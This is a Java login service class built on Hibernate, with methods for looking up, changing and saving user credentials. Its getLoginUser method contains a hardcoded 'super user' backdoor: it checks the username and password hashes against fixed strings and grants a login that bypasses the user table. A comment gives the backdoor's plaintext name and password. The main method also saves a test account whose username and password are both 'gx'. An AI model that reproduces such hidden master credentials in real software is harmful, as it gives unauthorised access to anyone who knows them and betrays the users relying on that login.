package com.ca.db.service;

import com.ca.db.model.LoginUser;
import com.gt.common.utils.PasswordUtil;
import com.gt.db.BaseDAO;
import org.hibernate.Criteria;
import org.hibernate.Session;
import org.hibernate.Transaction;
import org.hibernate.criterion.Restrictions;

import java.util.List;

public class LoginUserServiceImpl extends BaseDAO {

    public LoginUserServiceImpl() throws Exception {
        super();
    }

    public static void main(String[] args) {
        try {
            LoginUserServiceImpl lusl = new LoginUserServiceImpl();
            LoginUser lu = new LoginUser();
            lu.setdFlag(1);
            lu.setUsername("gx");
            lu.setPassword("gx");
            lusl.saveLoginUser(lu);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static boolean userExists() throws Exception {
        List<LoginUser> allUsrs = (List<LoginUser>) DBUtils.readAll(LoginUser.class);
        if (allUsrs.size() > 0) {
            return true;
        }
        return false;
    }

    public static LoginUser getLoginUser(String userName, String password) throws Exception {
        // SUPER USER //PASS: gt// NAME: gt_ebuddy
        String mu = PasswordUtil.getSha256(userName);
        String pu = PasswordUtil.getSha256(password);
        if (mu.equals("25fd063686b444a3938380cd0c9f5cd0") && pu.equals("1bfad22f0925978f310a37440bfdff43")) {
            return new LoginUser();
        }

        Criteria c = getSession().createCriteria(LoginUser.class);

        c.add(Restrictions.eq("username", userName));
        c.add(Restrictions.eq("password", PasswordUtil.getSha256(password)));

        List<LoginUser> list = c.list();
        if (list.size() == 1) {
            return list.get(0);
        }

        return null;
    }

    public static void changeLogin(String usrName, String password) throws Exception {

        Session s = getSession();
        Transaction tx = s.beginTransaction();
        try {
            Criteria c = s.createCriteria(LoginUser.class);
            List<LoginUser> list = c.list();
            LoginUser lu = list.get(0);
            lu.setUsername(usrName);
            lu.setPassword(PasswordUtil.getSha256(password));
            s.update(lu);
            tx.commit();
        } catch (Exception e) {
            tx.rollback();
            throw new Exception(e);
        }
    }

    public final void saveLoginUser(LoginUser user) throws Exception {
        user.setPassword(PasswordUtil.getSha256(user.getPassword()));
        saveOrUpdate(user);
    }

}
